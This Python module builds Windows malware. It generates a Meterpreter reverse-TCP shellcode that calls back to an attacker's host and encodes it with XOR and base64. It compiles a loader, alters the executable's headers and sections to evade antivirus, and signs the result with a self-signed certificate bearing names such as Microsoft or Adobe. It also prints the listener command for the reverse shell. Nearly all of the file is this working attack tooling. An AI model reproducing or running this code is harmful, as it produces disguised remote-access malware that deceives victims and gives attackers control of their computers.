# utils/generator.py
import subprocess
import os
import random
import tempfile
import time
import base64
import lief
import shutil
import json
from config import LHOST, LPORT, BASE_DIR

class Certificate:
    def __init__(self):
        self.certificates = {
            "microsoft": {"name": "Microsoft Corporation", "url": "https://www.microsoft.com", "exe": "office.exe"},
            "adobe": {"name": "Adobe Systems Incorporated", "url": "https://www.adobe.com", "exe": "adobe.exe"},
            "apple": {"name": "Apple Inc.", "url": "https://www.apple.com", "exe": "apple.exe"},
            "oracle": {"name": "Oracle Corporation", "url": "https://www.oracle.com", "exe": "oracle.exe"},
            "google": {"name": "Google LLC", "url": "https://www.google.com", "exe": "chrome.exe"},
            "mozilla": {"name": "Mozilla Corporation", "url": "https://www.mozilla.org", "exe": "firefox.exe"},
            "intel": {"name": "Intel Corporation", "url": "https://www.intel.com", "exe": "intel.exe"},
            "ibm": {"name": "IBM Corporation", "url": "https://www.ibm.com", "exe": "ibm.exe"}
        }

    def get_random_cert(self):
        key, value = random.choice(list(self.certificates.items()))
        return json.dumps({"id": key, "value": value})

def generate_payload(loader_name, cert_name, xor_key=None):
    """Generate payload with full evasion chain and fake signing"""
    
    # Initialize certificate utility
    cert_util = Certificate()
    certificate = json.loads(cert_util.get_random_cert() if not cert_name else 
                           json.dumps({"id": cert_name, "value": cert_util.certificates.get(cert_name, cert_util.certificates["microsoft"])}))
    
    # Use provided XOR key or generate random
    XOR_KEY = xor_key if xor_key else random.randint(1, 254)
    HEX_KEY = f"{XOR_KEY:02x}"
    print(f"[+] XOR key: 0x{HEX_KEY}")
    
    # Create temp directory
    temp_dir = tempfile.mkdtemp()
    os.chdir(temp_dir)
    
    PAYLOAD_NAME = "legit_app"
    TEMP_EXE = "temp_payload.exe"
    SHELLCODE_RAW = "sc.raw"
    HEADER_FILE = "shellcode_encoded.h"
    SIGN_CERT = f"{certificate['id']}.pfx"
    
    try:
        # 1. Generate raw shellcode
        print("[+] Generating raw shellcode...")
        subprocess.run([
            "msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", 
            f"LHOST={LHOST}", f"LPORT={LPORT}", 
            "EXITFUNC=thread", "-f", "raw", "-o", SHELLCODE_RAW
        ], check=True)

        # 2. Encode shellcode (XOR + Base64)
        print("[+] Encoding shellcode...")
        with open(SHELLCODE_RAW, "rb") as f:
            sc = f.read()

        xor_encoded = bytes([b ^ XOR_KEY for b in sc])
        b64_encoded = base64.b64encode(xor_encoded).decode()

        # 3. Generate C header with encoded shellcode
        with open(HEADER_FILE, "w") as f:
            f.write("#pragma once\n")
            f.write("const char *b64_shellcode =\n")
            for i in range(0, len(b64_encoded), 80):
                f.write(f' "{b64_encoded[i:i+80]}"\n')
            f.write(";\n")
            f.write(f"const unsigned char XOR_KEY = 0x{HEX_KEY};\n")

        # 4. Copy chosen loader
        loader_path = f"{BASE_DIR}/loaders/{loader_name}.cpp"
        subprocess.run(["cp", loader_path, "payload.cpp"], check=True)

        # 5. Compile with MinGW (evasion flags)
        print("[+] Compiling with MinGW...")
        subprocess.run([
            "x86_64-w64-mingw32-g++", "payload.cpp", "-o", TEMP_EXE, 
            "-lcrypt32", "-s", "-static", 
            "-Wl,--nxcompat", "-Wl,--dynamicbase", "-Wl,--high-entropy-va",
            "-O2", "-fno-strict-aliasing", "-w", "-lurlmon"
        ], check=True)

        # 6. Modify PE with LIEF for evasion
        print("[+] Modifying PE with evasion techniques...")
        MEM_READ = 0x40000000
        MEM_WRITE = 0x80000000
        MEM_EXECUTE = 0x20000000
        CNT_CODE = 0x00000020
        CNT_INITIALIZED_DATA = 0x00000040

        def modify_pe(input_path, output_path):
            binary = lief.parse(input_path)
            if binary is None:
                raise RuntimeError("Failed to parse PE")

            # Randomize timestamp
            binary.header.time_date_stamps = int(time.time()) - random.randint(1_000_000, 10_000_000)

            # Remove debug and rich header
            if binary.has_debug:
                binary.remove_debug()
            if binary.has_rich_header:
                binary.rich_header = None

            # Modify sections
            for section in binary.sections:
                if section.name not in [".text", ".rdata", ".idata"]:
                    section.name = ".data1"

                if section.has_characteristic(0x20000000):
                    section.characteristics = MEM_READ | MEM_EXECUTE | CNT_CODE
                else:
                    section.characteristics = MEM_READ | MEM_WRITE | CNT_INITIALIZED_DATA

                if section.size > 0x100:
                    section.size += (0x10 - (section.size % 0x10))

            config = lief.PE.Builder.config_t()
            builder = lief.PE.Builder(binary, config)
            builder.build()
            builder.write(output_path)

        modify_pe(TEMP_EXE, TEMP_EXE)

        # 7. Generate fake certificate
        print("[+] Generating fake self-signed cert...")
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048", 
            "-keyout", "key.pem", "-out", "cert.pem", 
            "-days", "365", "-nodes", "-subj", f"/CN={certificate['value']['name']}"
        ], check=True)

        # 8. Create PFX
        print("[+] Creating PFX...")
        subprocess.run([
            "openssl", "pkcs12", "-export", "-out", SIGN_CERT, 
            "-inkey", "key.pem", "-in", "cert.pem", 
            "-passout", "pass:123456"
        ], check=True)

        # 9. Sign executable
        print("[+] Signing executable...")
        final_output = f"payload_{loader_name}_{cert_name}_{HEX_KEY}.exe"
        subprocess.run([
            "osslsigncode", "sign", "-pkcs12", SIGN_CERT, 
            "-pass", "123456", "-n", f"{certificate['value']['exe']}", 
            "-i", f"{certificate['value']['url']}", 
            "-in", TEMP_EXE, "-out", final_output
        ], check=True)

        print(f"[+] Payload ready: {final_output}")
        print(f"[!] Use handler:")
        print(f" msfconsole -qx 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST={LHOST}; set LPORT={LPORT}; run'")

        # Return full path
        return os.path.join(temp_dir, final_output)

    except subprocess.CalledProcessError as e:
        print(f"[-] Error during generation: {e}")
        raise
    finally:
        # Cleanup temp directory (optional - comment out to keep artifacts)
        # shutil.rmtree(temp_dir, ignore_errors=True)
        os.chdir("..")
